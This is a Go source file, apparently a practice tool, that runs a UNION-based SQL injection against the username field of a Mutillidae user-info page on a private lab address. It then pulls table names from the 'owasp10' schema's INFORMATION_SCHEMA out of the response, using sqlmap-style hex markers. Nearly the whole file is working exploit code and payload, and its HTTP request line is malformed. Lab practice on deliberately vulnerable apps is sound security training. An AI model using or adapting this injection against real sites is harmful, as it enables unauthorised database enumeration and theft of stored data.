package main

import (
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net"
	"net/url"
	"regexp"
	"strings"
)

var payloads = []string{
	"e' UNION ALL SELECT NULL,CONCAT(0x717a7a7671,IFNULL(CAST(table_name AS NCHAR),0x20),0x7170706271),NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x6f776173703130)-- -",
	"e' ",
}

var HexFirst = "0x717a7a7671"
var HexSecond = "0x7170706271"

// CREATE AN ERROR INDICATOR COMPARE THE PAGE ON WHAT CHANGE AND READ FROM THAT

// type Query struct {
// 	Host          string
// 	Method        string
// 	ContentType   string
// 	Body          string
// 	ContentLength int32
// }

func NewQuery(cType, path, host, body string) string {
	var request strings.Builder
	method := "POST"
	bodyLength := len(body)

	reg, err := regexp.Compile("FUZZ")
	if err != nil {
		log.Panic(err)
	}
	fPath := reg.ReplaceAllString(path, url.QueryEscape(body))
	request.WriteString(fmt.Sprintf("%s %s\n HTTP/1.1 \r\n", method, fPath))
	request.WriteString(fmt.Sprintf("Host: %s \r\n", host))
	request.WriteString(fmt.Sprintf("Content-Type: %s \r\n", cType))
	if bodyLength > 0 {
		request.WriteString(fmt.Sprintf("Content-Length: %d \r\n", bodyLength))
	}
	request.WriteString("\r\n")
	return request.String()
}

func hexToString(str string) (string, error) {
	if strings.HasPrefix(str, "0x") || strings.HasPrefix(str, "0X") {
		fmt.Println(str, str[2:])
		str = str[2:]
	}
	bytes, err := hex.DecodeString(str)
	if err != nil {
		return "", err
	}

	return string(bytes), nil
}

func process(conn *net.Conn, req string) (string, error) {
	_, err := (*conn).Write([]byte(req))
	if err != nil {
		return "", err
	}

	response, err := io.ReadAll(*conn)
	if err != nil {
		return "", err
	}

	hexFirstStr, err := hexToString(HexFirst)
	if err != nil {
		log.Panic(err)
	}
	hexSecondStr, err := hexToString(HexSecond)
	if err != nil {
		fmt.Println(err)
	}

	patern := regexp.MustCompile(fmt.Sprintf("%s(.*?)%s", hexFirstStr, hexSecondStr))

	formattedRes := patern.FindAllStringSubmatch(string(response), -1)

	var gatheredString []string

	if len(formattedRes) > 0 {
		for _, res := range formattedRes {
			gatheredString = append(gatheredString, res[1])
		}
	}

	str := strings.Join(gatheredString, "\n")

	// if len(str) >0 {
	// 	return str,
	// }

	return str, nil
}

func main() {
	conn, err := net.Dial("tcp", "172.16.21.129:80")
	if err != nil {
		log.Panicf("Unable to dial, %v", err)
	}
	defer conn.Close()
	path := "/mutillidae/index.php?page=user-info.php&username=FUZZ&password=test&user-info-php-submit-button=View+Account+Details"
	contentType := "application/x-www-form-urlencoded"
	host := "172.16.21.129:80"

	req := NewQuery(contentType, path, host, payloads[0])

	res, err := process(&conn, req)
	if err != nil {
		log.Panic(err)
	}
	fmt.Println(res)

}
